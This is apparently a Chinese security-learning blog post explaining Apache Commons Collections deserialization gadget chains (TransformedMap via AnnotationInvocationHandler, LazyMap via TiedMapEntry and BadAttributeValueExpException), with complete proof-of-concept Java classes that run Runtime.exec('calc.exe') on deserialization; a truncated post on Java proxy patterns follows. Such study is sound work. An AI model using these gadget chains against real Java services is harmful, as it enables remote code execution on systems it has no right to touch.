<h1 id="ChainedTransformer-class"><a href="#ChainedTransformer-class" class="headerlink" title="ChainedTransformer.class"></a>ChainedTransformer.class</h1><p>Runtime 类并没有继承 Serializable 接口 , 因此我们无法直接传入实例对象</p>
<p>对此，采用通过 Java 反射机制来构建 <strong><code>java.lang.Runtime.getRuntime().exec()</code></strong> 方法调用链</p>
<p>但是要拿到Runtime实例要调用多种反射方法</p>
<p>因此要调用 getMethod() , getRuntime() , exec() , invoke() 这四个方法</p>
<p>org.apache.commons.collections.functors.ChainedTransformer类中，构造函数能传入一个transformer数组，然后transform方法会便利这个数组，调用数组中每个元素的transform方法，然后把获取到的方法返回，递归作为下一次transform方法的参数</p>
<p><img src="https://o.130014.xyz/2022/03/08/image-20220306104500-qq6ctvk.png" alt="image-20220306104500-qq6ctvk.png"></p>
<p>我们就可以利用这个类来创建反射调用链</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">org.apache.commons.collections.Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取到Runtime.getRuntime方法</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="comment">//反射调用getRuntime，获取到Runtime类</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="comment">//反射调用exec方法</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="ConstantTransformer-class"><a href="#ConstantTransformer-class" class="headerlink" title="ConstantTransformer.class"></a>ConstantTransformer.class</h1><p>如何在开始获取到Runtime实例对象，来getMethod，ConstantTransformer.class类中提供了方法</p>
<p><img src="https://o.130014.xyz/2022/03/08/image-20220307093339-lqwbyhx.png" alt="image-20220307093339-lqwbyhx.png"></p>
<p>可以在构造函数里传入Runtime对象，然后ConstantTransformer.transform会返回它</p>
<p>就可以这样构造</p>
<p>如此一来，无论transform方法中传入什么参数，都将执行我们构造的恶意链中的内容</p>
<p><img src="https://o.130014.xyz/2022/03/08/image-20220307093614-mqbkb82.png" alt="image-20220307093614-mqbkb82.png"></p>
<h1 id="攻击链"><a href="#攻击链" class="headerlink" title="攻击链"></a>攻击链</h1><p>上面虽然成功构造了反射命令执行链子，但是仍需要手动触发transform方法，实际情况中很少，所以要解决这个问题</p>
<p>我们想要在反序列化，也就是readObject方法的时候就调用恶意链，根据上一章，我们可以中重写此方法，实现defaultReadObject()方法，添加恶意功能，他仍然能被正常序列化和反序列化.</p>
<p>综上所述，</p>
<p><em>要在一个重写了的readObject方法中找到transform方法，且调用这个方法的实例可控。</em></p>
<h2 id="TransformedMap-攻击链"><a href="#TransformedMap-攻击链" class="headerlink" title="TransformedMap 攻击链"></a>TransformedMap 攻击链</h2><p>主要围绕org.apache.commons.collections.map.TransformedMap类</p>
<p>简单阅读下这个类信息</p>
<p>checkSetValue中调用了transform方法</p>
<p><img src="https://o.130014.xyz/2022/03/08/image-20220307095802-ieq9fmc.png" alt="image-20220307095802-ieq9fmc.png"></p>
<p>this.valueTransFormer可以在构造方法的时候传入，我们可控！</p>
<p><img src="https://o.130014.xyz/2022/03/08/image-20220307095912-ajqul2v.png" alt="image-20220307095912-ajqul2v.png"></p>
<p>它的构造方法是私有的，通过调用decorate方法返回一个新的TransformedMap类</p>
<p><img src="https://o.130014.xyz/2022/03/08/image-20220307100321-fsqthc6.png" alt="image-20220307100321-fsqthc6.png"></p>
<p>因为decorate方法第一个参数要传入一个Map类型的对象，直接创建一个hashmap是最快的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//初始一个hashmap</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br></pre></td></tr></table></figure>

<p>这样就调用了decorate方法</p>
<p>下面问题就是怎么调用checkSetValue方法</p>
<h3 id="AbstractInputCheckedMapDecorator-MapEntry-setValue"><a href="#AbstractInputCheckedMapDecorator-MapEntry-setValue" class="headerlink" title="AbstractInputCheckedMapDecorator$MapEntry.setValue()"></a>AbstractInputCheckedMapDecorator$MapEntry.setValue()</h3><p>这个类是TransformedMap的父类</p>
<p>其中静态类MapEntry的setValue方法调用了我们的目标方法checkSetValue</p>
<p>也就是说要调用setValue方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MapEntry</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapEntryDecorator</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">MapEntry</span><span class="params">(Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(entry);</span><br><span class="line">        <span class="built_in">this</span>.parent = parent;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">        value = <span class="built_in">this</span>.parent.checkSetValue(value);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.entry.setValue(value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将this.parent指向TransformedMap实例对象，就可以调用目标方法</p>
<p>然而这个静态类的构造函数也是私有的</p>
<h3 id="AbstractInputCheckedMapDecorator-EntrySetIterator-next"><a href="#AbstractInputCheckedMapDecorator-EntrySetIterator-next" class="headerlink" title="AbstractInputCheckedMapDecorator$EntrySetIterator.next()"></a>AbstractInputCheckedMapDecorator$EntrySetIterator.next()</h3><p>静态类EntrySetIterator中的next方法调用了这个构造函数，返回MapEntry实例对象</p>
<p>这就是我们要找的，用来调用上面setValue的对象</p>
<p><img src="https://o.130014.xyz/2022/03/08/image-20220307102335-k93svzi.png" alt="image-20220307102335-k93svzi.png"></p>
<p>因为构造函数中的this.parent我们还是不可控，所以继续更进</p>
<p>来自于EntrySetIterator()中，更进看哪里调用了这个构造函数</p>
<h3 id="AbstractInputCheckedMapDecorator-EntrySet-iterator"><a href="#AbstractInputCheckedMapDecorator-EntrySet-iterator" class="headerlink" title="AbstractInputCheckedMapDecorator$EntrySet.iterator()"></a>AbstractInputCheckedMapDecorator$EntrySet.iterator()</h3><p>可以看到在EntrySet静态类中的iterator调用了上面的EntrySetIterator()，它返回一个AbstractInputCheckedMapDecorator$EntrySetIterator实例对象</p>
<p>但是同样this.parent还是不可控，继续更进</p>
<p><img src="https://o.130014.xyz/2022/03/08/image-20220307102840-vbi5evz.png" alt="image-20220307102840-vbi5evz.png"></p>
<h3 id="AbstractInputCheckedMapDecorator-entrySet"><a href="#AbstractInputCheckedMapDecorator-entrySet" class="headerlink" title="AbstractInputCheckedMapDecorator.entrySet()"></a>AbstractInputCheckedMapDecorator.entrySet()</h3><p><img src="https://o.130014.xyz/2022/03/08/image-20220307153158-3fuixr7.png" alt="image-20220307153158-3fuixr7.png"></p>
<p>这里会根据 isSetValueChecking() 方法的返回值决定是否调用</p>
<p>AbstractInputCheckedMapDecorator.EntrySet() 方法 ，返回上面我们需要的对象</p>
<p>抽象类AbstractInputCheckedMapDecorator是TransformedMap 的父类</p>
<p>因此这里我们可以直接将 this 指向 TransformedMap</p>
<p>也就是用TransformedMap对象直接调用entrySet方法</p>
<p>最后是isSetValueChecking()方法，它要返回一个true</p>
<p><img src="https://o.130014.xyz/2022/03/08/image-20220307161309-3m83aem.png" alt="image-20220307161309-3m83aem.png"></p>
<p>略过</p>
<h3 id="总结TransformedMap攻击链"><a href="#总结TransformedMap攻击链" class="headerlink" title="总结TransformedMap攻击链"></a>总结TransformedMap攻击链</h3><p>这样一来利用链就到头了</p>
<p>我们不需要直接调用transform方法，只要通过entrySet&#x3D;&gt;iterator&#x3D;&gt;next&#x3D;&gt;setValue就可以调用到transform方法</p>
<p>而我们一开始调用entrySet的对象，是我们可控构造的TransformedMap对象，里面包含了可控的，上面构造的反射调用链子</p>
<p>这样一来便可以达到我们的最终目的：在下面重写readObject，反序列化的时候就可以自动触发攻击</p>
<p><img src="https://o.130014.xyz/2022/03/08/image-20220307184540-fonjrqr.png" alt="image-20220307184540-fonjrqr.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//初始化TransformMap，传入构造的反射执行链</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">outMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"><span class="comment">//触发漏洞</span></span><br><span class="line">Map.<span class="type">Entry</span> <span class="variable">next</span> <span class="operator">=</span> (Map.Entry) outMap.entrySet().iterator().next();</span><br><span class="line">next.setValue(<span class="string">&quot;xianbei&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://o.130014.xyz/2022/03/08/image-20220307190628-o5uyrjb.png" alt="image-20220307190628-o5uyrjb.png"></p>
<h3 id="sun-reflect-annotation-AnnotationInvocationHandler"><a href="#sun-reflect-annotation-AnnotationInvocationHandler" class="headerlink" title="sun.reflect.annotation.AnnotationInvocationHandler"></a>sun.reflect.annotation.AnnotationInvocationHandler</h3><p>现在的目标：找到一个重写的readObject方法，里面调用到了setValue()，也就是上面反序列化链子的入口</p>
<p>jdk1.7的sun.reflect.annotation.AnnotationInvocationHandler类的readObject()中调用了目标方法</p>
<p><img src="https://o.130014.xyz/2022/03/08/image-20220307202856-l81uvlp.png" alt="image-20220307202856-l81uvlp.png"></p>
<p>对这个方法进行分析，自己先看了一下发现，原来自己的分析方式有点不够好，这里跟着大佬的分析方式走</p>
<h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p>我们的目标当然是调用 AbstractInputCheckedMapDecorator$MapEntry.setValue()</p>
<p>首先有这几个条件：</p>
<p>var5为AbstractInputCheckedMapDecorator$MapEntry</p>
<blockquote>
<p><code>Entry var5 = (Entry)var4.next();</code></p>
<p>所以只要让var4为AbstractInputCheckedMapDecorator$EntrySetIterator即可</p>
</blockquote>
<p>var7.isInstance(var8)为false且var7!&#x3D;null</p>
<blockquote>
<p>B.Class.isInstance(a)：</p>
<p>a 是否能强转为 B 类型</p>
<p>var6为var5的键值，var7为(Class)var3.get(var6)的返回值</p>
<p>var8是var5的值</p>
</blockquote>
<p>var8 instanceof ExceptionProxy为false</p>
<h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><p>接着往上看var3和var4</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br></pre></td></tr></table></figure>

<p>我们希望this.memberValues指向AbstractInputCheckedMapDecorator下的Transformer类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br></pre></td></tr></table></figure>

<p>跟进memberTypes方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Map&lt;String, Class&lt;?&gt;&gt; memberTypes() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.memberTypes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.memberTypes = <span class="keyword">new</span> <span class="title class_">HashMap</span>(var2.length + <span class="number">1</span>, <span class="number">1.0F</span>);</span><br></pre></td></tr></table></figure>

<p>因此var3是一个HashMap，这样也就可以得到(Class)var3.get(var6)调用的是Map的get方法，也就是复制</p>
<h4 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h4><p>var2</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br></pre></td></tr></table></figure>

<p>所以现在要确认的就是</p>
<p>this.type，和this.memberValues</p>
<p>跟到构造函数中</p>
<p><img src="https://o.130014.xyz/2022/03/08/image-20220307210357-0iai9k9.png" alt="image-20220307210357-0iai9k9.png"></p>
<p>var1是个注解类，可以传入java.lang.annotation.Retention</p>
<p>var2为Map类型，可以传入TransformedMap实例对象</p>
<p>构造AnnotationInvocationHandler.AnnotationInvocationHandler()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">constructor.newInstance(java.lang.annotation.Retention.class,outMap);</span><br></pre></td></tr></table></figure>

<p>断点调试，可以看到</p>
<p><img src="https://o.130014.xyz/2022/03/08/image-20220307212430-yfht9sw.png" alt="image-20220307212430-yfht9sw.png"></p>
<h4 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h4><p><img src="https://o.130014.xyz/2022/03/08/image-20220307213755-iwy8gr6.png" alt="image-20220307213755-iwy8gr6.png"></p>
<p>因为特定了键值为value，所以构造HashMap的时候要指定键值为value</p>
<h3 id="完整反序列化poc"><a href="#完整反序列化poc" class="headerlink" title="完整反序列化poc"></a>完整反序列化poc</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilTest1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        org.apache.commons.collections.Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//获取到Runtime.getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用getRuntime，获取到Runtime类</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//初始一个hashmap</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//初始化TransformMap，传入构造的反射执行链</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);<span class="comment">//开放构造器访问权限</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">exp</span> <span class="operator">=</span> constructor.newInstance(Retention.class, outMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bout);</span><br><span class="line">        oos.writeObject(exp);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bout.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="LazyMap攻击链"><a href="#LazyMap攻击链" class="headerlink" title="LazyMap攻击链"></a>LazyMap攻击链</h2><h3 id="LazyMap-get"><a href="#LazyMap-get" class="headerlink" title="LazyMap.get()"></a>LazyMap.get()</h3><p>org.apache.commons.collections.map.LazyMap类中的get方法，其中调用了transform方法</p>
<p><img src="https://o.130014.xyz/2022/03/08/image-20220308015633-d90jogg.png" alt="image-20220308015633-d90jogg.png"></p>
<p>且this.factory可控，还是TransFormer对象</p>
<p><img src="https://o.130014.xyz/2022/03/08/image-20220308015818-nqdozu7.png" alt="image-20220308015818-nqdozu7.png"></p>
<p>因为get方法是public类型，所以直接可以构造利用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilTest2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        org.apache.commons.collections.Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//获取到Runtime.getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用getRuntime，获取到Runtime类</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lm</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">        lm.get(<span class="string">&quot;xianbei&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>因为暂未找到在readObject方法中调用get的类，所以跟踪get方法的调用栈，看哪些方法调用了get，并且他们有可能在readObject中被调用</p>
<h3 id="TiedMapEntry-getValue"><a href="#TiedMapEntry-getValue" class="headerlink" title="TiedMapEntry.getValue()"></a>TiedMapEntry.getValue()</h3><p><img src="https://o.130014.xyz/2022/03/08/image-20220308020444-nthp1e5.png" alt="image-20220308020444-nthp1e5.png"></p>
<p>可以看到getValue方法中调用了get，this.key也由构造方法中传入，我们可控</p>
<p>将this.map指向上面的LazyMap实例对象即可</p>
<h3 id="TiedMapEntry-toString"><a href="#TiedMapEntry-toString" class="headerlink" title="TiedMapEntry.toString()"></a>TiedMapEntry.toString()</h3><p><img src="https://o.130014.xyz/2022/03/08/image-20220308033859-dq9ssky.png" alt="image-20220308033859-dq9ssky.png"></p>
<p>这个类的toString()方法中调用了getValue，我们只要将this指向TiedMapEntry即可</p>
<h3 id="javax-management-BadAttributeValueExpException-readObject"><a href="#javax-management-BadAttributeValueExpException-readObject" class="headerlink" title="javax.management.BadAttributeValueExpException.readObject()"></a>javax.management.BadAttributeValueExpException.readObject()</h3><p><img src="https://o.130014.xyz/2022/03/08/image-20220308034152-8nduzjh.png" alt="image-20220308034152-8nduzjh.png"></p>
<p>javax.management.BadAttributeValueExpException类的readObject方法调用了toString()</p>
<p>我们把valObj指向上面的TiedMapEntry就可以触发</p>
<p>逆推看看valObj是咋来的</p>
<p>gf.get(“val”, null)就是拿到反序列化类中的val属性</p>
<p>val是BadAttributeValueExpException的一个私有属性</p>
<p><img src="https://o.130014.xyz/2022/03/08/image-20220308034523-lsxt49z.png" alt="image-20220308034523-lsxt49z.png"></p>
<p>因为我们想要控制的这个val是个私有属性</p>
<p>可以通过<strong>反射对私有属性赋值</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="literal">null</span>);</span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">ins</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);<span class="comment">//创建实例对象</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> ins.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);<span class="comment">//拿到BadAttributeValueExpException类的Field中的val属性</span></span><br><span class="line">val.setAccessible(<span class="literal">true</span>);<span class="comment">//设置访问权限为true</span></span><br><span class="line">val.set(ins,tiedMapEntry);<span class="comment">//修改ins实例对象中私有属性val的值为上面构建的TiedMapEntry</span></span><br></pre></td></tr></table></figure>


<p>这样就构建完成了，接着把ins进行序列化反序列化看看能不能触发</p>
<p><img src="https://o.130014.xyz/2022/03/08/image-20220308035447-qgsqcmt.png" alt="image-20220308035447-qgsqcmt.png"></p>
<p>成功成功</p>
<p>这条链子相对来说比上面哪个要简易一点</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
<li>反序列化漏洞：一般是触发点，在重写的readObject里有特定方法，为整条链子的入口</li>
<li>反射调用方法是最根本的漏洞成因</li>
<li>对于实例中的操作，要熟用反射</li>
<li>对于java的一些知识还需要进一步学习，反射，io，动态代理，Map，强转类型时候的细节，注解</li>
<li>还是要细心</li>
</ol>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.guildhab.top/2020/06/java-rmi-%e5%88%a9%e7%94%a84-%e6%9c%80%e5%9f%ba%e6%9c%ac%e7%9a%84%e4%b8%a4%e6%9d%a1-apache-commons-collections-pop-gadget-chains/">https://www.guildhab.top/2020/06/java-rmi-%e5%88%a9%e7%94%a84-%e6%9c%80%e5%9f%ba%e6%9c%ac%e7%9a%84%e4%b8%a4%e6%9d%a1-apache-commons-collections-pop-gadget-chains/</a></p>
]]></content>
      <categories>
        <category>javaSec</category>
      </categories>
      <tags>
        <tag>java反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA代理模式</title>
    <url>/2022/03/15/java%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<p>Java三种代理模式：静态代理、动态代理和cglib代理 <a href="https://segmentfault.com/a/1190000011291179">https://segmentfault.com/a/1190000011291179</a></p>
<p>Java 动态代理详解 <a href="https://juejin.cn/post/6844903744954433544#heading-3">https://juejin.cn/post/6844903744954433544#heading-3</a></p>
<h1 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h1><p>静态代理帮助我们实现功能增强的效果</p>
<p>我们可以在不入侵代理目标的源代码的情况下扩展他原来的方法</p>
<p>这种代理方式需要代理对象和目标对象<strong>实现一样的接口</strong></p>
<p>缺点：</p>
<ol>
<li>冗余。由于代理对象要实现与目标对象一致的接口，会产生过多的代理类。</li>
<li>不易维护。一旦接口增加方法，目标对象与代理对象都要进行修改。</li>
</ol>
<h1 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h1><p>考虑到静态代理的缺点，我们如何改进：</p>
<p>让代理类动态生成，就不用去定义过多的代理类。</p>
<h2 id="JDK动态代理"><a href="#JDK动态代理" class="headerlink" title="JDK动态代理"></a>JDK动态代理</h2><p>JDK动态代理主要涉及两个类：java.lang.reflect.Proxy 和 java.lang.reflect.InvocationHandler</p>
<p>先编写一个LogHandler来实现InvocationHandler接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.jdkDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LogHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="comment">//被代理的对象，实际的方法的执行者</span></span><br><span class="line">    Object target;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LogHandler</span><span class="params">(Object target)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">//实现InvocationHandler接口</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        before();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(target, args);</span><br><span class="line">        after();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(String.format(<span class="string">&quot;log start time [%s]&quot;</span>,<span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span 